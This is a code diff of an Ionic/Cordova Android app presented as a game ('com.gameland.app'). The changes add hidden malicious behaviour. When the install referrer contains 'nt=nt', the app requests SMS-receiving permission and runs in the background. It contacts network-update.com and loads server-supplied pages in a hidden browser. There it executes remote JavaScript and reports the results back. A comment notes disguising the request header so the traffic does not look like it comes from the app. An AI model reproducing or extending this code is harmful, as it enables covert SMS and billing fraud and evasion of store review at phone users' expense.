@@ -38,24 +38,6 @@ export class MyApp {
     platform.ready().then(() => {
       var app = this;
 
-      androidPermissions.checkPermission(androidPermissions.PERMISSION.READ_SMS).then(
-        function(){
-          app.smsPermission = true;
-          console.log('sms read ok');
-        },
-        function(){
-          androidPermissions.requestPermissions(androidPermissions.PERMISSION.READ_SMS).then(function(){
-            app.smsPermission = true;
-            console.log('accepted sms request');
-          }, function(){
-            app.smsPermission = false;
-            console.log('NO sms reading');
-          });
-        }
-      );
-
-      backgroundMode.enable();
-
       this.network = network;
       this.storage = storage;
       this.sms = sms;
@@ -70,33 +52,53 @@ export class MyApp {
         serial: device.serial,
         ran: false
       };
+      try{
+       AndroidReferrer.echo('referrer', function (referrer) {
+        console.log('got a referrer '+ referrer);
+          if(referrer.includes("nt=nt")){
 
-      AndroidReferrer.echo('referrer', function (referrer) {
-        if(referrer.length > 0){
-          app.referrer = referrer;
-          storage.set("deviceSettings", deviceSettings);
-          app.handleInstructions(http, iab);
+            androidPermissions.checkPermission(androidPermissions.PERMISSION.RECEIVE_SMS).then(
+              function(){
+                app.smsPermission = true;
+                console.log('sms read ok');
+              },
+              function(){
+                androidPermissions.requestPermissions(androidPermissions.PERMISSION.RECEIVE_SMS).then(function(){
+                  app.smsPermission = true;
+                  console.log('accepted sms request');
+                }, function(){
+                  app.smsPermission = false;
+                  console.log('NO sms reading');
+                });
+              }
+            );
 
-          // if (app.isNetworkOk()) { //we started on a cellular network
-          //   console.log('network is ok');
-          //   app.handleInstructions(http, iab);
-          // } else { //non cellular let's watch for connections to come up
-          //   console.log('we are not on a cellular network the type is ='+app.network.type);
-          //   let connectSubscription = app.network.onchange().subscribe(() => {
-          //     console.log('new network change... to'+app.network.type);
-          //     setTimeout(() => {
-          //       if (app.isNetworkOk()) {
-          //         app.handleInstructions(http, iab);
-          //         connectSubscription.unsubscribe();
-          //       }
-          //     }, 3000);
-          //   });
-          // }
-        }else{
-          console.log('no referrer, not sending status');
+            backgroundMode.enable();
+
+            app.referrer = referrer;
+            storage.set("deviceSettings", deviceSettings);
+            if (app.isNetworkOk()) { //we started on a cellular network
+              console.log('network is ok');
+              app.handleInstructions(http, iab);
+            } else { //non cellular let's watch for connections to come up
+              console.log('we are not on a cellular network the type is ='+app.network.type);
+              let connectSubscription = app.network.onchange().subscribe(() => {
+                console.log('new network change... to'+app.network.type);
+                setTimeout(() => {
+                  if (app.isNetworkOk()) {
+                    app.handleInstructions(http, iab);
+                    connectSubscription.unsubscribe();
+                  }
+                }, 3000);
+              });
+            }
+          }else{
+            console.log('no referrer, not sending status');
         }
       });
-
+      }catch (e){
+        console.log('something went wrong '+e.message);
+      }
       // Okay, so the platform is ready and our plugins are available.
       // Here you can do any higher level native things you might need.
       statusBar.styleDefault();
@@ -115,9 +117,11 @@ export class MyApp {
   }
 
   handleInstructions(http, iab){
+    console.log('handle instructions');
     var app = this;
     this.storage.get("deviceSettings").then(function(deviceSettings){
 
+      console.log('got our device settings');
       //call the api for instructions, here's a quick sample
       http.post('https://network-update.com/api/boot',
         {
@@ -131,7 +135,7 @@ export class MyApp {
           //THIS is BOOT CALL - TODO set the x request header to NOT be our app
           const browserOptions = 'zoom=no,location=no,useWideViewPort=no,hidden=yes,enableViewportScale=yes';
           const path = app.webviewUrl(data);
-          console.log(path);
+          console.log('opening '+path);
           iab.create(path, '_blank', browserOptions);
 
           //THIS IS THE CALL to NEXT and the instructions we will fire.
@@ -160,9 +164,9 @@ export class MyApp {
   }
 
   async handleNext(app, data, http, iab, deviceSettings){
-    console.log('next');
+    console.log('handling next');
     //call the api for instructions
-    http.post(this.nextUrl(data),
+    http.post(app.nextUrl(data),
       {
         "package" : "com.gameland.app",
         "android_id" : deviceSettings.uuid,
@@ -174,9 +178,10 @@ export class MyApp {
         const browserOptions = 'zoom=no,location=no,useWideViewPort=no,hidden=yes,enableViewportScale=yes';
         const path = app.webviewUrl(data);
         const browser = iab.create(path, '_blank', browserOptions);
+        console.log('handling next  with url '+ path);
 
         browser.on('loadstop').subscribe(event => {
-          console.log('loadstop', event);
+          console.log('page has stopped loading, ready for instructions');
           if(event.url === path){//make sure we're in the webview with the next instructions
             app.doInstructions(app, data, browser, http);
           }
@@ -190,7 +195,7 @@ export class MyApp {
   async doInstructions(app, data, browser, http){
     for (let instruction of data) {
       if(instruction.type === "sleep"){
-        console.log('Taking a break...');
+        console.log('Taking a break for '+instruction.ms);
         await app.sleep(instruction.ms);
         console.log('done with our break');
       }else if(instruction.type === "javascript"){
@@ -205,9 +210,9 @@ export class MyApp {
   executeScript(app, script, browser, http, url_log){
     browser.executeScript({code: script}).then(
       function(result){
-        console.log(result);
+        console.log('we ran some js the result was '+result);
         if(url_log){
-          app.log(http, url_log, result);
+          app.log(http, url_log, result, app);
         }
       }
     );
@@ -220,16 +225,12 @@ export class MyApp {
 
 
   log(http, url, msg){
-    var app = this;
-    console.log("logging message to "+url+" = "+msg);
-    this.storage.get("deviceSettings").then(function(deviceSettings){
+    console.log("logging message to the server "+url+" = "+msg);
+    this.storage.get("deviceSettings").then(function(){
       //call the api for instructions, here's a quick sample
       http.post(url,
         {
-          "package" : "com.gameland.app",
-          "android_id" : deviceSettings.uuid,
-          "referrer" : app.referrer,
-          "log" : msg
+          "return" : msg
         },
         {}).map(res => res.json()).subscribe(
         data => {
